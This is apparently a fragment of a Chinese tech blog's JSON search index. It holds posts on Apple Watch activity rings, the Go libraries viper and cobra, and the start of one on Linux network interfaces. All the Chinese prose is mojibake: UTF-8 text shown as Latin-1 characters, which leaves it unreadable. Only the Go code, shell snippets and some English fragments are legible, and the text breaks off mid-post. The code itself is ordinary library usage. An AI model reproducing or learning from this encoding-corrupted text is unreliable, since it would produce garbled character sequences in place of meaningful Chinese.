ç›¸å†Œä¸­ ã€‚\n\n### 2.2 å¥èº«è®°å½•è®¾ç½®\n\næŒ‰ä¸‹è¡¨å† è¿›å…¥APPåˆ—è¡¨ï¼Œæ‰“å¼€å¥èº«è®°å½•APPï¼Œåˆ’åˆ°æœ€ä¸‹æ–¹ï¼Œæ›´æ”¹ç›®æ ‡ã€‚\n\nApple Watch çš„ã€Œå¥èº«è®°å½•ã€ç”±ã€çº¢è‰²ï¼šæ´»åŠ¨ã€‘ï¼Œã€ç»¿è‰²ï¼šé”»ç‚¼ã€‘ï¼Œã€è“è‰²ï¼šç«™ç«‹ã€‘ç»„æˆã€‚\n\n+ çº¢è‰²ï¼šè¾¾æˆä½ çš„åŠ¨æ€å¡è·¯é‡Œæ¶ˆè€—ç›®æ ‡ï¼Œå°±èƒ½å¡«æ»¡æ´»åŠ¨åœ†ç¯ã€‚\n\n  ä½ ä¸Šç­æ—¶èµ°çš„é‚£å‡ æ­¥æ¥¼æ¢¯ã€é™ªå­©å­ç©è€ã€å¹²å®¶åŠ¡æ—¶çš„æ´»åŠ¨é‡ï¼Œæ— ä¸æ¶µç›–å…¶ä¸­ã€‚\n\n+ ç»¿è‰²ï¼šè¿›è¡Œè‡³å°‘ 30 åˆ†é’Ÿå¼ºåº¦ä¸ä½äºå¿«èµ°çš„è¿åŠ¨ï¼Œå°±èƒ½å¡«æ»¡é”»ç‚¼åœ†ç¯ã€‚\n\n  æ— è®ºä½ æ˜¯å¿«æ­¥è¡Œèµ°ï¼Œè¿˜æ˜¯è¿›è¡Œä½“èƒ½è®­ç»ƒ app å†…çš„æŸé¡¹è¿åŠ¨ï¼Œéƒ½åŒ…æ‹¬åœ¨å†…ã€‚\n\n+ è“è‰²ï¼šåœ¨ä¸€å¤©ä¸­çš„ 12 ä¸ªå°æ—¶é‡Œï¼Œæ¯å°æ—¶éƒ½è‡³å°‘èµ·èº«æ´»åŠ¨ 1 åˆ†é’Ÿï¼Œå°±èƒ½å¡«æ»¡ç«™ç«‹åœ†ç¯ã€‚\n\n\n\n# 3. å¸¸è§é—®é¢˜\n\n### 3.1 ä¸ªåˆ«ç¨‹åºå®‰è£…ä¸ä¸Š\n\né€‰æ‹©å»æ‰‹è¡¨çš„appstore ä¸‹è½½ã€‚\n\n### 3.2  å¤æ‚åŠŸèƒ½æ²¡æœ‰æµ·æ‹”é«˜åº¦\n\n1. ä»…é™ Apple Watch SE å’Œ Apple Watch Series 6ä»¥ä¸Šã€‚\n2. æœ‰å¯èƒ½æ˜¯æ‰‹æœºæŠŠæŒ‡å—é’ˆå¸è½½äº†ï¼Œéœ€è¦é‡æ–°å®‰è£…ä¸€ä¸‹æŒ‡å—é’ˆã€‚\n\n\n\n# 4. è¡¨ç›˜\n\n### 4.1  å¤ªé˜³è¡¨ç›˜\n\nå·¦ä¸Šï¼šç”µé‡\n\nå³ä¸Šï¼šä»Šæ—¥æ—¥æœŸ\n\nå·¦ä¸‹ï¼šé—¹é’Ÿ\n\nå³ä¸‹ï¼šæ°”æ¸©\n\n### 4.2 å›¾æ–‡æ¨¡å—\n\nå·¦ä¸Šï¼šæ•°å­—ç§’é’ˆ\n\næ—¥æœŸï¼š23å‘¨äº”\n\nä¸­é—´ï¼šè„‰ææ›²çº¿å›¾ï¼ˆheart watchï¼‰\n\nå·¦ä¸‹ï¼šæµ·æ‹”é«˜åº¦\n\nåº•éƒ¨å±…ä¸­ï¼šæŒ‡å—é’ˆ\n\nå³ä¸‹ï¼šè„‰æå›¾è¡¨ï¼ˆheart watchï¼‰\n\n","tags":["applewatch"],"categories":["watch"]},{"title":"golangé…ç½®ä¿¡æ¯åº“viperçš„ä½¿ç”¨","url":"%2Fp%2Fe2f28eb4.html","content":"\n### 0. å‰è¨€\n\nViper(æ¯’è›‡)æ˜¯ä¸€ä¸ªæ–¹ä¾¿Goè¯­è¨€åº”ç”¨ç¨‹åºå¤„ç†é…ç½®ä¿¡æ¯çš„åº“ã€‚å®ƒå¯ä»¥å¤„ç†å¤šç§æ ¼å¼çš„é…ç½®ã€‚å®ƒæ”¯æŒçš„ç‰¹æ€§ï¼š\n\n- è®¾ç½®é»˜è®¤å€¼\n- ä»JSONï¼ŒTOMLï¼ŒYAMLï¼ŒHCLå’ŒJavaå±æ€§é…ç½®æ–‡ä»¶ä¸­è¯»å–\n- å®æ—¶è§‚çœ‹å’Œé‡æ–°è¯»å–é…ç½®æ–‡ä»¶ï¼ˆå¯é€‰ï¼‰\n- ä»ç¯å¢ƒå˜é‡ä¸­è¯»å–\n- ä»è¿œç¨‹é…ç½®ç³»ç»Ÿï¼ˆetcdæˆ–Consulï¼‰è¯»å–ï¼Œå¹¶è§‚å¯Ÿå˜åŒ–\n- ä»å‘½ä»¤è¡Œæ ‡å¿—è¯»å–\n- ä»ç¼“å†²åŒºè¯»å–\n- è®¾ç½®æ˜¾å¼å€¼\n\n<!-- more -->\n\nViperè¯»å–é…ç½®ä¿¡æ¯çš„ä¼˜å…ˆçº§é¡ºåºï¼Œä»é«˜åˆ°ä½ï¼Œå¦‚ä¸‹ï¼š\n\n- æ˜¾å¼è°ƒç”¨Setå‡½æ•°\n- å‘½ä»¤è¡Œå‚æ•°\n- ç¯å¢ƒå˜é‡\n- é…ç½®æ–‡ä»¶\n- key/value å­˜å‚¨ç³»ç»Ÿ\n- é»˜è®¤å€¼\n\nViper çš„é…ç½®é¡¹çš„keyä¸åŒºåˆ†å¤§å°å†™ã€‚\n\n\n\n### 1. å®‰è£…ä½¿ç”¨\n\n##### 1.0 å®‰è£…\n\n```bash\ngo get -u github.com/spf13/viper\n```\n\n\n\n##### 1.1 è®¾ç½®é»˜è®¤å€¼\n\né»˜è®¤å€¼ä¸æ˜¯å¿…é¡»çš„ï¼Œå¦‚æœé…ç½®æ–‡ä»¶ã€ç¯å¢ƒå˜é‡ã€è¿œç¨‹é…ç½®ç³»ç»Ÿã€å‘½ä»¤è¡Œå‚æ•°ã€Setå‡½æ•°éƒ½æ²¡æœ‰æŒ‡å®šæ—¶ï¼Œé»˜è®¤å€¼å°†èµ·ä½œç”¨ã€‚\n\n```go\nviper.SetDefault(\"ContentDir\", \"content\")\nviper.SetDefault(\"LayoutDir\", \"layouts\")\nviper.SetDefault(\"Taxonomies\", map[string]string{\"tag\": \"tags\", \"category\": \"categories\"})\n```\n\n\n\n##### 1.2 è¯»å–é…ç½®æ–‡ä»¶\n\nViperæ”¯æŒJSONã€TOMLã€YAMLã€HCLå’ŒJava propertiesæ–‡ä»¶ã€‚\nViperå¯ä»¥æœç´¢å¤šä¸ªè·¯å¾„ï¼Œä½†ç›®å‰å•ä¸ªViperå®ä¾‹ä»…æ”¯æŒå•ä¸ªé…ç½®æ–‡ä»¶ã€‚\nViperé»˜è®¤ä¸æœç´¢ä»»ä½•è·¯å¾„ã€‚\nä»¥ä¸‹æ˜¯å¦‚ä½•ä½¿ç”¨Viperæœç´¢å’Œè¯»å–é…ç½®æ–‡ä»¶çš„ç¤ºä¾‹ã€‚\nè·¯å¾„ä¸æ˜¯å¿…éœ€çš„ï¼Œä½†æœ€å¥½è‡³å°‘åº”æä¾›ä¸€ä¸ªè·¯å¾„ï¼Œä»¥ä¾¿æ‰¾åˆ°ä¸€ä¸ªé…ç½®æ–‡ä»¶ã€‚\n\n```go\nviper.SetConfigName(\"config\") //  è®¾ç½®é…ç½®æ–‡ä»¶å (ä¸å¸¦åç¼€)\nviper.AddConfigPath(\"/etc/appname/\")   // ç¬¬ä¸€ä¸ªæœç´¢è·¯å¾„\nviper.AddConfigPath(\"$HOME/.appname\")  // å¯ä»¥å¤šæ¬¡è°ƒç”¨æ·»åŠ è·¯å¾„\nviper.AddConfigPath(\".\")               // æ¯”å¦‚æ·»åŠ å½“å‰ç›®å½•\nerr := viper.ReadInConfig() // æœç´¢è·¯å¾„ï¼Œå¹¶è¯»å–é…ç½®æ•°æ®\nif err != nil {\n    panic(fmt.Errorf(\"Fatal error config file: %s \\n\", err))\n}\n```\n\n\n\n##### 1.3 ç›‘è§†é…ç½®æ–‡ä»¶ï¼Œé‡æ–°è¯»å–é…ç½®æ•°æ®\n\nViperæ”¯æŒè®©æ‚¨çš„åº”ç”¨ç¨‹åºåœ¨è¿è¡Œæ—¶æ‹¥æœ‰è¯»å–é…ç½®æ–‡ä»¶çš„èƒ½åŠ›ã€‚\néœ€è¦é‡æ–°å¯åŠ¨æœåŠ¡å™¨ä»¥ä½¿é…ç½®ç”Ÿæ•ˆçš„æ—¥å­å·²ç»ä¸€å»ä¸å¤è¿”äº†ï¼Œç”±viperé©±åŠ¨çš„åº”ç”¨ç¨‹åºå¯ä»¥åœ¨è¿è¡Œæ—¶è¯»å–å·²æ›´æ–°çš„é…ç½®æ–‡ä»¶ï¼Œå¹¶ä¸”ä¸ä¼šé”™è¿‡ä»»ä½•èŠ‚æ‹ã€‚\nåªéœ€è¦è°ƒç”¨viperå®ä¾‹çš„WatchConfigå‡½æ•°ï¼Œä½ ä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ªå›è°ƒå‡½æ•°æ¥è·å¾—å˜åŠ¨çš„é€šçŸ¥ã€‚\n\n```go\nviper.WatchConfig()\nviper.OnConfigChange(func(e fsnotify.Event) {\n    fmt.Println(\"Config file changed:\", e.Name)\n})\n```\n\n\n\n##### 1.4 ä» io.Reader ä¸­è¯»å–é…ç½®\n\nViperé¢„å…ˆå®šä¹‰äº†è®¸å¤šé…ç½®æºï¼Œä¾‹å¦‚æ–‡ä»¶ã€ç¯å¢ƒå˜é‡ã€å‘½ä»¤è¡Œå‚æ•°å’Œè¿œç¨‹K / Vå­˜å‚¨ç³»ç»Ÿï¼Œä½†æ‚¨å¹¶æœªå—å…¶çº¦æŸã€‚\næ‚¨ä¹Ÿå¯ä»¥å®ç°è‡ªå·±çš„é…ç½®æºï¼Œå¹¶æä¾›ç»™viperã€‚\n\n```go\nviper.SetConfigType(\"yaml\") // or viper.SetConfigType(\"YAML\")\n\n// any approach to require this configuration into your program.\nvar yamlExample = []byte(`\nHacker: true\nname: steve\nhobbies:\n- skateboarding\n- snowboarding\n- go\nclothing:\n  jacket: leather\n  trousers: denim\nage: 35\neyes : brown\nbeard: true\n`)\n\nviper.ReadConfig(bytes.NewBuffer(yamlExample))\nviper.Get(\"name\") // è¿”å› \"steve\"\n```\n\n\n\n##### 1.5 æ³¨å†Œå¹¶ä½¿ç”¨åˆ«å\n\n```go\nviper.RegisterAlias(\"loud\", \"Verbose\")\n\nviper.Set(\"verbose\", true) \nviper.Set(\"loud\", true)   // è¿™ä¸¤å¥è®¾ç½®çš„éƒ½æ˜¯åŒä¸€ä¸ªå€¼\n\nviper.GetBool(\"loud\") // true\nviper.GetBool(\"verbose\") // true\n```\n\n\n\n##### 1.6 ä»ç¯å¢ƒå˜é‡ä¸­è¯»å–\n\nViper å®Œå…¨æ”¯æŒç¯å¢ƒå˜é‡ï¼Œè¿™æ˜¯çš„åº”ç”¨ç¨‹åºå¯ä»¥å¼€ç®±å³ç”¨ã€‚\næœ‰å››ä¸ªå’Œç¯å¢ƒå˜é‡æœ‰å…³çš„æ–¹æ³•ï¼š\n\n+ AutomaticEnv()\n+ BindEnv(string...) : error\n+ SetEnvPrefix(string)\n+ SetEnvKeyReplacer(string...) *strings.Replacer\n\næ³¨æ„ï¼Œç¯å¢ƒå˜é‡æ—¶åŒºåˆ†å¤§å°å†™çš„ã€‚\n\nViperæä¾›äº†ä¸€ç§æœºåˆ¶æ¥ç¡®ä¿Envå˜é‡æ˜¯å”¯ä¸€çš„ã€‚é€šè¿‡SetEnvPrefixï¼Œåœ¨ä»ç¯å¢ƒå˜é‡è¯»å–æ—¶ä¼šæ·»åŠ è®¾ç½®çš„å‰ç¼€ã€‚BindEnvå’ŒAutomaticEnvéƒ½ä¼šä½¿ç”¨åˆ°è¿™ä¸ªå‰ç¼€ã€‚\n\nBindEnvéœ€è¦ä¸€ä¸ªæˆ–ä¸¤ä¸ªå‚æ•°ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯é”®åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ç¯å¢ƒå˜é‡çš„åç§°ã€‚ç¯å¢ƒå˜é‡çš„åç§°åŒºåˆ†å¤§å°å†™ã€‚å¦‚æœæœªæä¾›ENVå˜é‡åç§°ï¼Œåˆ™Viperä¼šè‡ªåŠ¨å‡å®šè¯¥é”®åç§°ä¸ENVå˜é‡åç§°åŒ¹é…ï¼Œå¹¶ä¸”ENVå˜é‡ä¸ºå…¨éƒ¨å¤§å†™ã€‚å½“æ‚¨æ˜¾å¼æä¾›ENVå˜é‡åç§°æ—¶ï¼Œå®ƒä¸ä¼šè‡ªåŠ¨æ·»åŠ å‰ç¼€ã€‚\n\nä½¿ç”¨ENVå˜é‡æ—¶è¦æ³¨æ„ï¼Œå½“å…³è”åï¼Œæ¯æ¬¡è®¿é—®æ—¶éƒ½ä¼šè¯»å–è¯¥ENVå€¼ã€‚Viperåœ¨BindEnvè°ƒç”¨æ—¶ä¸è¯»å–ENVå€¼ã€‚\n\nAutomaticEnvä¸SetEnvPrefixç»“åˆå°†ä¼šç‰¹åˆ«æœ‰ç”¨ã€‚å½“AutomaticEnvè¢«è°ƒç”¨æ—¶ï¼Œä»»ä½•viper.Getè¯·æ±‚éƒ½ä¼šå»è·å–ç¯å¢ƒå˜é‡ã€‚ç¯å¢ƒå˜é‡åä¸ºSetEnvPrefixè®¾ç½®çš„å‰ç¼€ï¼ŒåŠ ä¸Šå¯¹åº”åç§°çš„å¤§å†™ã€‚\n\nSetEnvKeyReplacerå…è®¸ä½ ä½¿ç”¨ä¸€ä¸ªstrings.Replacerå¯¹è±¡æ¥å°†é…ç½®åé‡å†™ä¸ºEnvåã€‚å¦‚æœä½ æƒ³åœ¨Get()ä¸­ä½¿ç”¨åŒ…å«-çš„é…ç½®å ï¼Œä½†å¸Œæœ›å¯¹åº”çš„ç¯å¢ƒå˜é‡ååŒ…å«_åˆ†éš”ç¬¦ï¼Œå°±å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•ã€‚ä½¿ç”¨å®ƒçš„ä¸€ä¸ªä¾‹å­å¯ä»¥åœ¨é¡¹ç›®ä¸­viper_test.goæ–‡ä»¶é‡Œæ‰¾åˆ°ã€‚\nä¾‹å­ï¼š\n\n```go\nSetEnvPrefix(\"spf\") // å°†ä¼šè‡ªåŠ¨è½¬ä¸ºå¤§å†™\nBindEnv(\"id\")\n\nos.Setenv(\"SPF_ID\", \"13\") // é€šå¸¸é€šè¿‡ç³»ç»Ÿç¯å¢ƒå˜é‡æ¥è®¾ç½®\n\nid := Get(\"id\") // 13\n```\n\n\n\n##### 1.7 ç»‘å®šå‘½ä»¤è¡Œå‚æ•°\n\nViperæ”¯æŒç»‘å®špflagså‚æ•°ã€‚\nå’ŒBindEnvä¸€æ ·ï¼Œå½“ç»‘å®šæ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œè¯¥å€¼æ²¡æœ‰è¢«è·å–ï¼Œè€Œæ˜¯åœ¨è¢«è®¿é—®æ—¶è·å–ã€‚è¿™æ„å‘³ç€åº”è¯¥å°½æ—©è¿›è¡Œç»‘å®šï¼Œç”šè‡³æ˜¯åœ¨init()å‡½æ•°ä¸­ç»‘å®šã€‚\n\nåˆ©ç”¨BindPFlag()æ–¹æ³•å¯ä»¥ç»‘å®šå•ä¸ªflagã€‚ä¾‹å­ï¼š\n\n```go\nserverCmd.Flags().Int(\"port\", 1138, \"Port to run Application server on\")\nviper.BindPFlag(\"port\", serverCmd.Flags().Lookup(\"port\"))\n```\n\n\nä½ ä¹Ÿå¯ä»¥ç»‘å®šå·²å­˜åœ¨çš„pflagé›†åˆ (pflag.FlagSet):\n\n```go\npflag.Int(\"flagname\", 1234, \"help message for flagname\")\n\npflag.Parse()\nviper.BindPFlags(pflag.CommandLine)\n\ni := viper.GetInt(\"flagname\") // é€šè¿‡viperä»pflagä¸­è·å–å€¼\n```\n\n\nä½¿ç”¨pflagå¹¶ä¸å½±å“å…¶ä»–åº“ä½¿ç”¨æ ‡å‡†åº“ä¸­çš„flagã€‚é€šè¿‡å¯¼å…¥ï¼Œpflagå¯ä»¥æ¥ç®¡é€šè¿‡æ ‡å‡†åº“çš„flagå®šä¹‰çš„å‚æ•°ã€‚è¿™æ˜¯é€š`è¿‡è°ƒç”¨pflagåŒ…ä¸­çš„AddGoFlagSet()æ–¹æ³•å®ç°çš„ã€‚ä¾‹å­ï¼š\n\n```go\npackage main\n\nimport (\n    \"flag\"\n    \"github.com/spf13/pflag\"\n)\n\nfunc main() {\n\n    // using standard library \"flag\" package\n    flag.Int(\"flagname\", 1234, \"help message for flagname\")\n\n    pflag.CommandLine.AddGoFlagSet(flag.CommandLine)\n    pflag.Parse()\n    viper.BindPFlags(pflag.CommandLine)\n\n    i := viper.GetInt(\"flagname\") // retrieve value from viper\n\n    ...\n}\n```\n\n\n\n##### 1.8 è·å–å€¼\n\nåœ¨Viperä¸­ï¼Œæœ‰ä¸€äº›æ ¹æ®å€¼çš„ç±»å‹è·å–å€¼çš„æ–¹æ³•ã€‚å­˜åœ¨ä¸€ä¸‹æ–¹æ³•ï¼š\n\n+ Get(key string) : interface{}\n\n+ GetBool(key string) : bool\n\n+ GetFloat64(key string) : float64\n\n+ GetInt(key string) : int\n\n+ GetString(key string) : string\n\n+ GetStringMap(key string) : map[string]interface{}\n\n+ GetStringMapString(key string) : map[string]string\n\n+ GetStringSlice(key string) : []string\n\n+ GetTime(key string) : time.Time\n\n+ GetDuration(key string) : time.Duration\n\n+ IsSet(key string) : bool\n\n\nå¦‚æœGetå‡½æ•°æœªæ‰¾åˆ°å€¼ï¼Œåˆ™è¿”å›å¯¹åº”ç±»å‹çš„ä¸€ä¸ªé›¶å€¼ã€‚å¯ä»¥é€šè¿‡ IsSet() æ–¹æ³•æ¥æ£€æµ‹ä¸€ä¸ªå¥æ˜¯å¦å­˜åœ¨ã€‚ä¾‹å­:\n\n```go\nviper.GetString(\"logfile\") // Setting & Getting ä¸åŒºåˆ†å¤§å°å†™\nif viper.GetBool(\"verbose\") {\n    fmt.Println(\"verbose enabled\")\n}\n```\n\n\n\n##### 1.9 è®¿é—®åµŒå¥—é”®\n\nè®¿é—®æ–¹æ³•ä¹Ÿæ¥å—åµŒå¥—çš„é”®ã€‚ä¾‹å¦‚ï¼Œå¦‚æœåŠ è½½äº†ä»¥ä¸‹JSONæ–‡ä»¶ï¼š\n\n```json\n{\n    \"host\": {\n        \"address\": \"localhost\",\n        \"port\": 5799\n    },\n    \"datastore\": {\n        \"metric\": {\n            \"host\": \"127.0.0.1\",\n            \"port\": 3099\n        },\n        \"warehouse\": {\n            \"host\": \"198.0.0.1\",\n            \"port\": 2112\n        }\n    }\n}\n```\n\n\nViperå¯ä»¥é€šè¿‡.åˆ†éš”ç¬¦æ¥è®¿é—®åµŒå¥—çš„å­—æ®µï¼š\n\n```go\nGetString(\"datastore.metric.host\") // (returns \"127.0.0.1\")\n```\n\n\nè¿™éµå®ˆå‰é¢ç¡®ç«‹çš„ä¼˜å…ˆè§„åˆ™; ä¼šæœç´¢è·¯å¾„ä¸­æ‰€æœ‰é…ç½®ï¼Œç›´åˆ°æ‰¾åˆ°ä¸ºæ­¢ã€‚\nä¾‹å¦‚ï¼Œä¸Šé¢çš„æ–‡ä»¶ï¼Œdatastore.metric.hostå’Œ datastore.metric.portéƒ½å·²ç»å®šä¹‰ï¼ˆå¹¶ä¸”å¯èƒ½è¢«è¦†ç›–ï¼‰ã€‚å¦‚æœå¦å¤– datastore.metric.protocolçš„é»˜è®¤å€¼ï¼ŒViperä¹Ÿä¼šæ‰¾åˆ°å®ƒã€‚\n\nä½†æ˜¯ï¼Œå¦‚æœdatastore.metricå€¼è¢«è¦†ç›–ï¼ˆé€šè¿‡æ ‡å¿—ï¼Œç¯å¢ƒå˜é‡ï¼ŒSetæ–¹æ³•ï¼Œ...ï¼‰ï¼Œåˆ™æ‰€æœ‰datastore.metricçš„å­é”®å°†ä¼šæœªå®šä¹‰ï¼Œå®ƒä»¬è¢«ä¼˜å…ˆçº§æ›´é«˜çš„é…ç½®å€¼æ‰€â€œé®è”½â€ã€‚\n\næœ€åï¼Œå¦‚æœå­˜åœ¨ç›¸åŒ¹é…çš„åµŒå¥—é”®ï¼Œåˆ™å…¶å€¼å°†è¢«è¿”å›ã€‚ä¾‹å¦‚ï¼š\n\n```json\n{\n    \"datastore.metric.host\": \"0.0.0.0\",\n    \"host\": {\n        \"address\": \"localhost\",\n        \"port\": 5799\n    },\n    \"datastore\": {\n        \"metric\": {\n            \"host\": \"127.0.0.1\",\n            \"port\": 3099\n        },\n        \"warehouse\": {\n            \"host\": \"198.0.0.1\",\n            \"port\": 2112\n        }\n    }\n}\n\nGetString(\"datastore.metric.host\") // returns \"0.0.0.0\"\n```\n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ [Golangçš„é…ç½®ä¿¡æ¯å¤„ç†æ¡†æ¶Viper](https://blog.51cto.com/13599072/2072753)\n+ https://www.jishuwen.com/d/2vNk","tags":["viper"],"categories":["4_golangå®æˆ˜"]},{"title":"golangå‘½ä»¤è¡Œåº“cobraçš„ä½¿ç”¨","url":"%2Fp%2Fd50935d7.html","content":"\n### 0. å‰è¨€\n\nCobra(çœ¼é•œè›‡)æ˜¯ä¸€ä¸ªåº“ï¼Œå…¶æä¾›ç®€å•çš„æ¥å£æ¥åˆ›å»ºå¼ºå¤§ç°ä»£çš„CLIæ¥å£ï¼Œç±»ä¼¼äºgitæˆ–è€…goå·¥å…·ã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªåº”ç”¨ï¼Œç”¨æ¥ç”Ÿæˆä¸ªäººåº”ç”¨æ¡†æ¶ï¼Œä»è€Œå¼€å‘ä»¥Cobraä¸ºåŸºç¡€çš„åº”ç”¨ã€‚Dockeræºç ä¸­ä½¿ç”¨äº†Cobraã€‚\n\nCobraåŸºäºä¸‰ä¸ªåŸºæœ¬æ¦‚å¿µ`commands`,`arguments`å’Œ`flags`ã€‚å…¶ä¸­commandsä»£è¡¨è¡Œä¸ºï¼Œargumentsä»£è¡¨æ•°å€¼ï¼Œflagsä»£è¡¨å¯¹è¡Œä¸ºçš„æ”¹å˜ã€‚\n\nåŸºæœ¬æ¨¡å‹å¦‚ä¸‹ï¼š\n\n```bash\nAPPNAME COMMAND ARG --FLAG\n\n# hugoæ˜¯cmmands serveræ˜¯commandsï¼Œportæ˜¯flag\nhugo server --port=1313\n\n# cloneæ˜¯commandsï¼ŒURLæ˜¯argumentsï¼Œbraeæ˜¯flags\ngit clone URL --bare\n```\n\n\n<!-- more -->\n\n\n\n### 1. å®‰è£…å’Œä½¿ç”¨\n\nå®‰è£…:\n\n```bash\ngo get -u github.com/spf13/cobra/cobra\n```\n\n\n\nä½ çš„é¡¹ç›®ç»“æ„å¯èƒ½å¦‚ä¸‹:\n\n```bash\n  â–¾ appName/\n    â–¾ cmd/\n        root.go\n        version.go\n        commands.go\n      main.go\n```\n\n\n\n##### 1.1 main.go\n\nIn a Cobra app, typically the main.go file is very bare(è£¸éœ²). It serves one purpose: initializing Cobra.\n\n```go\npackage main\n\nimport (\n  \"appName/cmd\"\n)\n\nfunc main() {\n  cmd.Execute()\n}\n```\n\n\n\n##### 1.2 rootcmd\n\n```go\nvar rootCmd = &cobra.Command{\n  Use:   \"hugo\",\n  Short: \"Hugo is a very fast static site generator\",\n  Long: `A Fast and Flexible Static Site Generator built with\n                love by spf13 and friends in Go.\n                Complete documentation is available at http://hugo.spf13.com`,\n  Run: func(cmd *cobra.Command, args []string) {\n    // Do Stuff Here\n  },\n}\n\nfunc Execute() {\n  if err := rootCmd.Execute(); err != nil {\n    fmt.Println(err)\n    os.Exit(1)\n  }\n}\n```\n\n\n\n##### 1.3 additional commands\n\n```go\npackage cmd\n\nimport (\n  \"fmt\"\n\n  \"github.com/spf13/cobra\"\n)\n\nfunc init() {\n  rootCmd.AddCommand(versionCmd)\n}\n\nvar versionCmd = &cobra.Command{\n  Use:   \"version\",\n  Short: \"Print the version number of Hugo\",\n  Long:  `All software has versions. This is Hugo's`,\n  Run: func(cmd *cobra.Command, args []string) {\n    fmt.Println(\"Hugo Static Site Generator v0.9 -- HEAD\")\n  },\n}\n```\n\n\n\nå¯ä»¥ç®€å•æ‰§è¡Œä¸‹é¢å‘½ä»¤æŸ¥çœ‹æ•ˆæœ\n\n```bash\ngo run main.go help\ngo run main.go version\n```\n\n\n\n### 3. cobra ç”Ÿæˆå™¨\n\nåœ¨æ–‡ä»¶å¤¹github.com/spf13/cobra/cobraä¸‹ä½¿ç”¨go install, ç”Ÿæˆ cobraå‘½ä»¤\n\nå‘½ä»¤`cobra init [yourApp]`å°†ä¼šåˆ›å»ºåˆå§‹åŒ–åº”ç”¨ï¼ŒyourApp æ˜¯ä½ çš„é¡¹ç›®åç§°ã€‚å®ƒä¼šåœ¨ä½ çš„ GOPATH ç›®å½•ä¸‹é¢ç”Ÿæˆé¡¹ç›®ã€‚æœ€æ–°çš„æ“ä½œæ–¹å¼:\n\n```bash\ncd /Users/liuwei/golang/src/github.com/unix2dos/golangTest\ncobra init --pkg-name=github.com/unix2dos/golangTest yourApp\n```\n\n\n\næ¥ä¸‹æ¥æˆ‘ä»¬ç”¨`cobra add`æ¥æ·»åŠ ä¸€äº›å­å‘½ä»¤ã€‚åœ¨ä½ é¡¹ç›®çš„ç›®å½•ä¸‹ï¼Œè¿è¡Œä¸‹é¢è¿™äº›å‘½ä»¤ï¼š\n\n```bash\ncobra add serve\ncobra add config\ncobra add create -p 'configCmd'\n```\n\nè¿™æ ·ä»¥åï¼Œä½ å°±å¯ä»¥è¿è¡Œä¸Šé¢é‚£äº› app serve ä¹‹ç±»çš„å‘½ä»¤äº†ã€‚é¡¹ç›®ç›®å½•å¦‚ä¸‹ï¼š\n\n```bash\nâ–¾ app/\n  â–¾ cmd/\n      serve.go\n      config.go\n      create.go\n    main.go\n```\n\n\n\n### 4. ä½¿ç”¨Flags\n\ncobra æœ‰ä¸¤ç§ flagï¼Œä¸€ä¸ªæ˜¯å…¨å±€å˜é‡ï¼Œä¸€ä¸ªæ˜¯å±€éƒ¨å˜é‡ã€‚å…¨å±€ä»€ä¹ˆæ„æ€å‘¢ï¼Œå°±æ˜¯æ‰€ä»¥å­å‘½ä»¤éƒ½å¯ä»¥ç”¨ã€‚å±€éƒ¨çš„åªæœ‰è‡ªå·±èƒ½ç”¨ã€‚å…ˆçœ‹å…¨å±€çš„ï¼š\n\n```go\nRootCmd.PersistentFlags().StringVar(&cfgFile, \"config\", \"\", \"config file (default is $HOME/.cobra_exp1.yaml)\")\n```\n\nåœ¨çœ‹å±€éƒ¨çš„ï¼š\n\n```go\nRootCmd.Flags().BoolP(\"toggle\", \"t\", false, \"Help message for toggle\")\n```\n\nåŒºåˆ«å°±åœ¨ RootCmd åé¢çš„æ˜¯ Flags è¿˜æ˜¯ PersistentFlagsã€‚\n\n\n\n### 5. å‚è€ƒèµ„æ–™\n\n+ [Golangä¹‹ä½¿ç”¨Cobra](https://o-my-chenjian.com/2017/09/20/Using-Cobra-With-Golang/)\n\n+ https://www.kancloud.cn/liupengjie/go/1010466","tags":["cobra"],"categories":["4_golangå®æˆ˜"]},{"title":"ç½‘ç»œæ¥å£ä»‹ç»","url":"%2Fp%2F9dad86f4.html","content":"\n### 1. ç½‘ç»œæ¥å£ä»‹ç»\n\n##### 1.1 ç½‘ç»œæ¥å£çš„å‘½å\n\nç½‘ç»œæ¥å£å¹¶ä¸å­˜åœ¨ä¸€å®šçš„å‘½åè§„èŒƒï¼Œä½†ç½‘ç»œæ¥å£åå­—çš„å®šä¹‰ä¸€èˆ¬éƒ½æ˜¯è¦æœ‰æ„ä¹‰çš„ã€‚ä¾‹å¦‚ï¼š\n\n+ eth0: ethernetçš„ç®€å†™ï¼Œä¸€èˆ¬ç”¨äºä»¥å¤ªç½‘æ¥å£ã€‚\n\n+ wifi0:wifiæ˜¯æ— çº¿å±€åŸŸç½‘ï¼Œå› æ­¤wifi0ä¸€èˆ¬æŒ‡æ— çº¿ç½‘ç»œæ¥å£ã€‚\n\n+ ath0: Atherosçš„ç®€å†™ï¼Œä¸€èˆ¬æŒ‡AtherosèŠ¯ç‰‡æ‰€åŒ…å«çš„æ— çº¿ç½‘ç»œæ¥å£ã€‚\n\n+ lo: localçš„ç®€å†™ï¼Œä¸€èˆ¬æŒ‡æœ¬åœ°ç¯å›æ¥å£ã€‚\n\n<!-- more -->\n\n##### 1.2 ç½‘ç»œæ¥å£å¦‚ä½•å·¥ä½œ\n\nç½‘ç»œæ¥å£æ˜¯ç”¨æ¥å‘é€å’Œæ¥å—æ•°æ®åŒ…çš„åŸºæœ¬è®¾å¤‡ã€‚\n\nç³»ç»Ÿä¸­çš„æ‰€æœ‰ç½‘ç»œæ¥å£ç»„æˆä¸€ä¸ªé“¾çŠ¶ç»“æ„ï¼Œåº”ç”¨å±‚ç¨‹åºä½¿ç”¨æ—¶æŒ‰åç§°è°ƒç”¨ã€‚\n\næ¯ä¸ªç½‘ç»œæ¥å£åœ¨linuxç³»ç»Ÿä¸­å¯¹åº”äºä¸€ä¸ªstruct net_deviceç»“æ„ä½“ï¼ŒåŒ…å«name,mac,mask,mtuâ€¦ä¿¡æ¯ã€‚\n\næ¯ä¸ªç¡¬ä»¶ç½‘å¡(ä¸€ä¸ªMAC)å¯¹åº”ä¸€ä¸ªç½‘ç»œæ¥å£ï¼Œå…¶å·¥ä½œå®Œå…¨ç”±ç›¸åº”çš„é©±åŠ¨ç¨‹åºæ§åˆ¶ã€‚\n\n##### 1.3 